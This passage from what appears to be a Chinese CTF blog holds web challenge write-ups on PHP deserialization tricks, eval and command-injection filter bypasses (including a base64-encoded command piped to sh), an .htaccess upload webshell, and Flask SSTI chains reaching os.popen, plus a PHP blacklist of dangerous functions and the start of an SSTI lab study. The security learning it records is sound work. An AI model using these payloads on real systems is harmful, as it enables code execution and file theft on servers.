第一种情况</span><br>    name=lemon&amp;sign=gogogo<br>    a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;lemon&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;sign&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;gogogo&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;number&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;2020&quot;</span>;&#125;<br>a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;sign&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;gogogo&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;number&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;2020&quot;</span>;&#125;<br><span class="hljs-keyword">bool</span>(<span class="hljs-literal">false</span>) <span class="hljs-comment">#lemon被替换 无法反序列化</span><br>    <span class="hljs-comment">#第二种情况</span><br>     name=pika&amp;sign=<span class="hljs-string">&quot;;s:6:&quot;</span>number<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-number">2020</span><span class="hljs-string">&quot;;&#125;   </span><br><span class="hljs-string">    a:3 &#123;s:4:&quot;</span>name<span class="hljs-string">&quot;;s:4:&quot;</span>pika<span class="hljs-string">&quot;;s:4:&quot;</span>sign<span class="hljs-string">&quot;;s:27:&quot;</span><span class="hljs-string">&quot;;s:6:&quot;</span>number<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-number">2020</span><span class="hljs-string">&quot;;&#125;&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;number&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;2020&quot;</span>;&#125;<br>a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pika&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;sign&quot;</span>;s:<span class="hljs-number">27</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;number&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;2020&quot;</span>;&#125;<span class="hljs-string">&quot;;s:6:&quot;</span>number<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-number">2020</span><span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">array(3) &#123; [&quot;</span>name<span class="hljs-string">&quot;]=&gt; string(4) &quot;</span>pika<span class="hljs-string">&quot; [&quot;</span>sign<span class="hljs-string">&quot;]=&gt; string(27) &quot;</span><span class="hljs-string">&quot;;s:6:&quot;</span>number<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-number">2020</span><span class="hljs-string">&quot;;&#125;&quot;</span> [<span class="hljs-string">&quot;number&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;2020&quot;</span> &#125;<br><span class="hljs-comment">#第三种情况</span><br>    name=shyshyshyshyshyshyshyshyshy&amp;sign=hello123<span class="hljs-string">&quot;;s:4:&quot;</span>sign<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-keyword">eval</span><span class="hljs-string">&quot;;s:6:&quot;</span>number<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-number">2000</span><span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">a:3:&#123;s:4:&quot;</span>name<span class="hljs-string">&quot;;s:27:&quot;</span>shyshyshyshyshyshyshyshyshy<span class="hljs-string">&quot;;s:4:&quot;</span>sign<span class="hljs-string">&quot;;s:57:&quot;</span>hello123<span class="hljs-string">&quot;;s:4:&quot;</span>sign<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-keyword">eval</span><span class="hljs-string">&quot;;s:6:&quot;</span>number<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-number">2000</span><span class="hljs-string">&quot;;&#125;&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;number&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;2020&quot;</span>;&#125;<br><br>a:<span class="hljs-number">3</span>:a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">27</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;sign&quot;</span>;s:<span class="hljs-number">57</span>:<span class="hljs-string">&quot;hello123&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;sign&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;eval&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;number&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;2000&quot;</span>;&#125;<span class="hljs-string">&quot;;s:6:&quot;</span>number<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-number">2020</span><span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(3) &#123; [&quot;</span>name<span class="hljs-string">&quot;]=&gt; string(27) &quot;</span><span class="hljs-string">&quot;;s:4:&quot;</span>sign<span class="hljs-string">&quot;;s:57:&quot;</span>hello123<span class="hljs-string">&quot; [&quot;</span>sign<span class="hljs-string">&quot;]=&gt; string(4) &quot;</span><span class="hljs-keyword">eval</span><span class="hljs-string">&quot; [&quot;</span>number<span class="hljs-string">&quot;]=&gt; string(4) &quot;</span><span class="hljs-number">2000</span><span class="hljs-string">&quot; &#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">payload</span>：<span class="hljs-selector-tag">changechangechangechangechangechangechange</span>&quot;;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:&quot;password&quot;</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;easy&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/nT2bhM7QjVOFN8s.png" alt="image-20201108222105587"></p><h3 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">// flag在flag.php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\(.*\)/&#x27;</span>, $_GET[<span class="hljs-string">&#x27;a&#x27;</span>]))<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>        ob_start(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">$data</span>)</span>&#123;<br>                 <span class="hljs-keyword">if</span> (strpos($data, <span class="hljs-string">&#x27;flag&#x27;</span>) !== <span class="hljs-literal">false</span>)<br>                 <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ByeBye hacker&#x27;</span>;<br>                 <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                 &#125;);<br>        <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">payload:</span> <span class="hljs-string">?a</span>=echo <span class="hljs-string">`cat flag.php|base64`</span>;   <span class="hljs-comment"># 注意最后需要引号，这样是完整的php代码</span><br></code></pre></td></tr></table></figure><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>show_source(<span class="hljs-keyword">__FILE__</span>);<br>$username  = <span class="hljs-string">&quot;admin&quot;</span>;<br>$password  = <span class="hljs-string">&quot;password&quot;</span>;<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>$data = <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;data&#x27;</span>])? $_POST[<span class="hljs-string">&#x27;data&#x27;</span>]: <span class="hljs-string">&quot;&quot;</span> ;<br>$data_unserialize = unserialize($data);<br><span class="hljs-keyword">if</span> ($data_unserialize[<span class="hljs-string">&#x27;username&#x27;</span>]==$username&amp;&amp;$data_unserialize[<span class="hljs-string">&#x27;password&#x27;</span>]==$password)&#123;<br>    <span class="hljs-keyword">echo</span> $flag;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>php反序列化  弱等于</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">payload</span>: <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;<span class="hljs-attribute">b</span>:<span class="hljs-number">1</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;<span class="hljs-attribute">b</span>:<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure><blockquote><p>flag.php里面将username与password修改了因此不能直接序列化</p><p>看代码感觉能直接序列化，但是结果就是不行，才尝试这个方法</p></blockquote><h3 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h3><p><img src="https://i.loli.net/2020/11/12/1tG2VufTJ8mR5kO.png" alt="image-20201112215551987"></p><p>本题禁止文件中出现某些字符，并且禁止了某些文件名</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">使用 <span class="hljs-selector-class">.htaccess</span> 攻击 经过测试发现<span class="hljs-selector-class">.htaccess</span>可以上传<br>*** <span class="hljs-selector-class">.htaccess</span> 文件内容可以换行输入 <br>*** 一句话木马也可以简化<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/EAm4nINolJzpdMb.png" alt="image-20201112215939469"></p><p><img src="https://i.loli.net/2020/11/12/4oRyYeV2SNUfjXs.png" alt="image-20201112220014395"></p><h3 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h3><h4 id="预备知识SSTI"><a href="#预备知识SSTI" class="headerlink" title="预备知识SSTI"></a>预备知识SSTI</h4><blockquote><p>开始时由于没有学ssti导致一头雾水，网上乱扒payload，结果显然失败（还是自己认真学一下吧）</p></blockquote><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><ol><li>SSTI的解题步骤：找基本类—&gt;找子类—&gt;找可利用的子类模板</li></ol><p>本题过滤了[]  ‘ ‘ “” __</p><blockquote><p>使用   |attr(request.args.value) 绕过</p></blockquote><p>首先查看基本类</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">原来的语句：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.base__</span>&#125;&#125;</span><br><span class="xml">绕过语句：</span><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">request.args.class</span>)|attr(<span class="hljs-name">request.args.base</span>)&#125;&#125;</span><span class="xml">&amp;class=__class__&amp;base=__base__</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/10/ZfNh8rXKsmwItW6.png" alt="image-20201110223125694"></p><p>找子类</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">原句：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.base__.__subclasses__</span>()&#125;&#125;</span><br><span class="xml">绕过：</span><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">request.args.class</span>)|attr(<span class="hljs-name">request.args.base</span>)|attr(<span class="hljs-name">request.args.sub</span>)()&#125;&#125;</span><span class="xml">&amp;class=__class__&amp;base=__base__&amp;sub=__subclasses__</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/10/GmDwX2RiZTyqI9u.png" alt="image-20201110225005807"></p><p>选择某一个子类</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">原句：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[199]&#125;&#125;</span><span class="xml">输出第199个</span><br><span class="xml">绕过: </span><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">request.args.class</span>)|attr(<span class="hljs-name">request.args.base</span>)|attr(<span class="hljs-name">request.args.sub</span>)()|attr(<span class="hljs-name">request.args.getitem</span>)(<span class="hljs-name">199</span>)&#125;&#125;</span><span class="xml">&amp;&amp;class=__class__&amp;base=__base__&amp;sub=__subclasses__&amp;getitem=__getitem__</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/10/vqSNMkbALn6DQs2.png" alt="image-20201110231227463"></p><p>读取flag</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">原句:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">warnings.catch_warnings.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]</span>(<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat%20/flag.txt&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="xml">绕过：</span><span class="hljs-template-variable">&#123;&#123;(()|<span class="hljs-name">attr</span>(<span class="hljs-name">request.args.class</span>)|attr(<span class="hljs-name">request.args.base</span>)|attr(<span class="hljs-name">request.args.sub</span>)()|attr(<span class="hljs-name">request.args.getitem</span>)(<span class="hljs-name">166</span>))|attr(<span class="hljs-name">request.args.init</span>)|attr(<span class="hljs-name">request.args.globals</span>)|attr(<span class="hljs-name">request.args.getitem</span>)(<span class="hljs-name">request.args.builtins</span>)|attr(<span class="hljs-name">request.args.getitem</span>)(<span class="hljs-name">request.args.eval</span>)(<span class="hljs-name">request.args.param</span>)&#125;&#125;</span><span class="xml">&amp;class=__class__&amp;base=__base__&amp;sub=__subclasses__&amp;getitem=__getitem__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;eval=eval&amp;param=__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/10/nSrJy95afpuUv4Q.png" alt="image-20201110235346373"></p><blockquote><p>注意细心 千万不要把字母拼错</p></blockquote><h3 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h3><blockquote><p>命令执行 绕过</p></blockquote><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">?url=<span class="hljs-number">127</span>|sort%<span class="hljs-number">09</span>index.php<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/bNUpZqs6fIvegHd.png" alt="image-20201112220350802"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">查看flag的位置：?url=<span class="hljs-number">127</span>|ls<span class="hljs-symbol">%09</span>../../../../<br>获取flag：??url=<span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>|echo<span class="hljs-symbol">%09</span><span class="hljs-keyword">c</span><span class="hljs-number">29</span>ydCAuL<span class="hljs-keyword">i8</span>uL<span class="hljs-keyword">i8</span>uL<span class="hljs-keyword">i8</span>uL<span class="hljs-keyword">i9</span>mbGFn|base<span class="hljs-number">64</span><span class="hljs-symbol">%09</span>-d|sh<br># 使用base<span class="hljs-number">64</span>绕过过滤<br></code></pre></td></tr></table></figure><h3 id="ezfind"><a href="#ezfind" class="headerlink" title="ezfind"></a>ezfind</h3><p><img src="https://i.loli.net/2020/11/14/DsAPdxUfl1pKGHo.png" alt="image-20201114173433689"></p><blockquote><p>此题很玄学  非预期</p></blockquote><h3 id="L0vephp"><a href="#L0vephp" class="headerlink" title="L0vephp"></a>L0vephp</h3><blockquote><p>此题需要找到正确的入口(?action=)</p></blockquote><p>查看源代码</p><p><img src="https://i.loli.net/2020/11/17/HikUYbcWPlmLo3Q.png" alt="image-20201117235651530"></p><p>发现了最后一段为base85编码</p><p><img src="https://i.loli.net/2020/11/17/PhO2oEnmVtM7dQX.png" alt="image-20201117235634186"></p><blockquote><p>此题过滤了base64 所以这里采用  php://filter/convert.quoted-printable-encode/resource=flag.php</p></blockquote><p>获取到了flag.php 再解码</p><p><img src="https://i.loli.net/2020/11/15/KwgAlnCI4TSjhXt.png" alt="image-20201115130752260"></p><p>发现flag是假的，并且看见了提示，使用hex解码</p><p><img src="https://i.loli.net/2020/11/15/Fa3MrlTECSRHvk6.png" alt="image-20201115130847252"></p><p>访问获得源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>error_reporting(<span class="hljs-number">0</span>);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br>$code=$_REQUEST[<span class="hljs-string">&#x27;code&#x27;</span>];<br><br>$_=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;@&#x27;</span>,<span class="hljs-string">&#x27;\~&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>,<span class="hljs-string">&#x27;\&amp;&#x27;</span>,<span class="hljs-string">&#x27;\?&#x27;</span>,<span class="hljs-string">&#x27;\&lt;&#x27;</span>,<span class="hljs-string">&#x27;\&gt;&#x27;</span>,<span class="hljs-string">&#x27;\*&#x27;</span>,<span class="hljs-string">&#x27;\`&#x27;</span>,<span class="hljs-string">&#x27;\+&#x27;</span>,<span class="hljs-string">&#x27;\-&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;\\\\&#x27;</span>,<span class="hljs-string">&#x27;\/&#x27;</span>); <br>$__=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-string">&#x27;shell_exec&#x27;</span>,<span class="hljs-string">&#x27;assert&#x27;</span>,<span class="hljs-string">&#x27;passthru&#x27;</span>,<span class="hljs-string">&#x27;array_map&#x27;</span>,<span class="hljs-string">&#x27;ob_start&#x27;</span>,<span class="hljs-string">&#x27;create_function&#x27;</span>,<span class="hljs-string">&#x27;call_user_func&#x27;</span>,<span class="hljs-string">&#x27;call_user_func_array&#x27;</span>,<span class="hljs-string">&#x27;array_filter&#x27;</span>,<span class="hljs-string">&#x27;proc_open&#x27;</span>);<br>$blacklist1 = array_merge($_);<br>$blacklist2 = array_merge($__);<br><br><span class="hljs-keyword">if</span> (strlen($code)&gt;<span class="hljs-number">16</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Too long&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">foreach</span> ($blacklist1 <span class="hljs-keyword">as</span> $blacklisted) &#123; <br>    <span class="hljs-keyword">if</span> (preg_match (<span class="hljs-string">&#x27;/&#x27;</span> . $blacklisted . <span class="hljs-string">&#x27;/m&#x27;</span>, $code)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;WTF???&#x27;</span>); <br>    &#125; <br>&#125; <br><br><span class="hljs-keyword">foreach</span> ($blacklist2 <span class="hljs-keyword">as</span> $blackitem) &#123;<br>    <span class="hljs-keyword">if</span> (preg_match (<span class="hljs-string">&#x27;/&#x27;</span> . $blackitem . <span class="hljs-string">&#x27;/im&#x27;</span>, $code)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Sry,try again&#x27;</span>);<br>    &#125;<br>&#125;<br>@<span class="hljs-keyword">eval</span>($code);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>目前做到这里就不会了 ， 先空着等之后去学习一下大佬的wp</p><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">eval长度限制绕过</a></p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">利用变长参数特性展开数组<br>变长参数是PHP5.<span class="hljs-number">6</span>新引入的新特性，php中可以使用<span class="hljs-keyword">func</span>(...<span class="hljs-variable">$arr</span>)这样的方式将<span class="hljs-variable">$arr</span>数组展开成多个参数传入<span class="hljs-keyword">func</span>函数<br></code></pre></td></tr></table></figure><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs smali">传入样例：<br>POST /test.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert HTTP/1.1<br>Host: localhost:8081<br>Accept: */*<br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 22<br><br>param=usort(...$_GET);<br><br>usort() 使用用户定义的比较函数对数组进行排序<br>usort(array,myfunction) <span class="hljs-built_in"> array </span>必须填写，规定需要排序的数组<br>     myfunction  可选，定义了一个可调用的比较函数的字符串<br>     <br>GET变量被展开成为了两个参数[&#x27;test&#x27;,&#x27;var_dump($_SERVER)&#x27;] 和 assert 传入了usort函数。usort函数的第二个参数是一个回调函数assert，其调用了第一个参数的var_dump($_SERVER),即可执行函数。<br></code></pre></td></tr></table></figure><blockquote><p>开始解题</p></blockquote><p><img src="https://i.loli.net/2020/11/18/AD8K32O9EtQ1wXZ.png" alt="image-20201118000348977"></p><p>获取flag  直接使用 cat /f*</p><p><img src="https://i.loli.net/2020/11/18/3ZCv6k8XKfVhdGI.png" alt="image-20201118001001096"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI-Study</title>
    <link href="/2020/11/12/SSTI-Study/"/>
    <url>/2020/11/12/SSTI-Study/</url>
    
    <content type="html"><![CDATA[<h4 id="注入大致流程"><a href="#注入大致流程" class="headerlink" title="注入大致流程"></a>注入大致流程</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> 检测漏洞，寻找注入点<br><span class="hljs-number">2.</span>查询基本类<br><span class="hljs-number">3.</span>查找子类<br><span class="hljs-number">4.</span>找到子类中可以读取文件或命令执行的模块<br></code></pre></td></tr></table></figure><blockquote><p>搭建的是vulhub的ssti靶场</p></blockquote><a id="more"></a><h3 id="查询注入点"><a href="#查询注入点" class="headerlink" title="查询注入点"></a>查询注入点</h3><p><img src="https://i.loli.net/2020/11/12/4Tg2eSL6FMxkZf9.png" alt="image-20201112172534902"></p><h3 id="查看基本类"><a href="#查看基本类" class="headerlink" title="查看基本类"></a>查看基本类</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">?<span class="hljs-built_in">name</span>=&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>&#125;&#125;<br>?<span class="hljs-built_in">name</span>=&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>&#125;&#125;<br>?<span class="hljs-built_in">name</span>=&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">0</span>]&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/Nrv4CEonVlPt9QJ.png" alt="image-20201112172830078"></p><p><img src="https://i.loli.net/2020/11/12/kK4tRx3jrGNvypf.png" alt="image-20201112172810920"></p><p><img src="https://i.loli.net/2020/11/12/KhoCuX8tMD4pFYz.png" alt="image-20201112172948831"></p><h3 id="查看子类"><a href="#查看子类" class="headerlink" title="查看子类"></a>查看子类</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">查看所有子类</span><br><span class="xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.subclasses__</span>()&#125;&#125;</span><br><span class="xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__[1].__subclasses__</span>()&#125;&#125;</span><br><span class="xml">查看某一个子类</span><br><span class="xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.subclasses__</span>()[166]&#125;&#125;</span><br><span class="xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__[1].__subclasses__</span>()[166]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/6F1W9GxwE4NbrKD.png" alt="image-20201112183533974"></p><p><img src="https://i.loli.net/2020/11/12/6xcTyqzGDjJnk94.png" alt="image-20201112183911218"></p><h3 id="查看166号子类的模板"><a href="#查看166号子类的模板" class="headerlink" title="查看166号子类的模板"></a>查看166号子类的模板</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">166</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span 